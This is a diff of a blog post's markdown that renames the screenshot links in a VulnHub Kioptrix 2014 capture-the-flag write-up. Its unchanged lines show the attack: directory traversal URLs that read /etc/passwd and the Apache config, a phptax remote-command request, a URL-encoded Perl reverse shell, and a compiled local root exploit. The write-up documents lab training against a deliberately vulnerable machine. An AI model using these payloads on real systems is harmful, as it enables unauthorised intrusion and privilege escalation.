@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Kioptrix: 2014 (#5)](https://www.vulnhub.com/entry/kioptrix-2014-5,62/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix5/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix5/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -35,11 +35,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 2\. While exploring the `80/tcp` service, we find a HTML comment that points to `pChart2.1.3/index.php`:  
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot01.png.webp)  
 
-![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_kioptrix5/screenshot02.png)  
+![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_kioptrix5/screenshot02.png.webp)  
 
-![writeup.enumeration.steps.2.3](/static/files/posts_vulnhub_kioptrix5/screenshot03.png)  
+![writeup.enumeration.steps.2.3](/static/files/posts_vulnhub_kioptrix5/screenshot03.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -56,11 +56,11 @@ searchsploit -x 31173
 http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix5/screenshot04.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix5/screenshot04.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix5/screenshot05.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix5/screenshot05.png.webp)  
 
-![writeup.exploitation.steps.1.3](/static/files/posts_vulnhub_kioptrix5/screenshot06.png)  
+![writeup.exploitation.steps.1.3](/static/files/posts_vulnhub_kioptrix5/screenshot06.png.webp)  
 
 2\. We use the directory traversal vulnerability to look for the Apache configuration file as `8080/tcp` is returning a `403 Forbidden` code:  
 ```
@@ -78,11 +78,11 @@ http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&Script=/../../u
   </Directory>
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot07.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot07.png.webp)  
 
 3\. The web server is configured to only allow clients with a user-agent string starting with the `Mozilla/4.0` string. We use Burp proxy to make a request to the `8080/tcp` service:  
 
-![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_kioptrix5/screenshot08.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_kioptrix5/screenshot08.png.webp)  
 
 4\. Now that we can talk to the `8080/tcp` service, we find a reference to the `/phptax/` web application on this server. We find a remote code execution vulnerability for `phptax` and leverage it to get command execution:  
 ```
@@ -95,13 +95,13 @@ GET /phptax/data/rce.php?cmd=uname%20-a HTTP/1.1
   Host: 192.168.92.185:8080
 ```
 
-![writeup.exploitation.steps.4.1](/static/files/posts_vulnhub_kioptrix5/screenshot09.png)  
+![writeup.exploitation.steps.4.1](/static/files/posts_vulnhub_kioptrix5/screenshot09.png.webp)  
 
-![writeup.exploitation.steps.4.2](/static/files/posts_vulnhub_kioptrix5/screenshot10.png)  
+![writeup.exploitation.steps.4.2](/static/files/posts_vulnhub_kioptrix5/screenshot10.png.webp)  
 
-![writeup.exploitation.steps.4.3](/static/files/posts_vulnhub_kioptrix5/screenshot11.png)  
+![writeup.exploitation.steps.4.3](/static/files/posts_vulnhub_kioptrix5/screenshot11.png.webp)  
 
-![writeup.exploitation.steps.4.4](/static/files/posts_vulnhub_kioptrix5/screenshot12.png)  
+![writeup.exploitation.steps.4.4](/static/files/posts_vulnhub_kioptrix5/screenshot12.png.webp)  
 
 5\. We find that the remote system is FreeBSD 9. We tried Bash and Python reverse shells but both failed and as such we fall back on a [Perl reverse shell](https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/) for interactive access:  
 ```
@@ -113,9 +113,9 @@ GET /phptax/data/rce.php?cmd=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24
   Host: 192.168.92.185:8080
 ```
 
-![writeup.exploitation.steps.5.1](/static/files/posts_vulnhub_kioptrix5/screenshot13.png)  
+![writeup.exploitation.steps.5.1](/static/files/posts_vulnhub_kioptrix5/screenshot13.png.webp)  
 
-![writeup.exploitation.steps.5.2](/static/files/posts_vulnhub_kioptrix5/screenshot14.png)  
+![writeup.exploitation.steps.5.2](/static/files/posts_vulnhub_kioptrix5/screenshot14.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -150,21 +150,21 @@ gcc -o 28718 28718.c
 ./28718
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix5/screenshot15.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix5/screenshot15.png.webp)  
 
-![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_kioptrix5/screenshot16.png)  
+![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_kioptrix5/screenshot16.png.webp)  
 
-![writeup.privesc.steps.1.3](/static/files/posts_vulnhub_kioptrix5/screenshot17.png)  
+![writeup.privesc.steps.1.3](/static/files/posts_vulnhub_kioptrix5/screenshot17.png.webp)  
 
-![writeup.privesc.steps.1.4](/static/files/posts_vulnhub_kioptrix5/screenshot18.png)  
+![writeup.privesc.steps.1.4](/static/files/posts_vulnhub_kioptrix5/screenshot18.png.webp)  
 
-![writeup.privesc.steps.1.5](/static/files/posts_vulnhub_kioptrix5/screenshot19.png)  
+![writeup.privesc.steps.1.5](/static/files/posts_vulnhub_kioptrix5/screenshot19.png.webp)  
 
 2\. We can now view the `congrats.txt` file to complete the challenge:  
 ```
 cat /root/congrats.txt
 ```
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot20.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix5/screenshot20.png.webp)  
 
 ## Loot
 ### Hashes
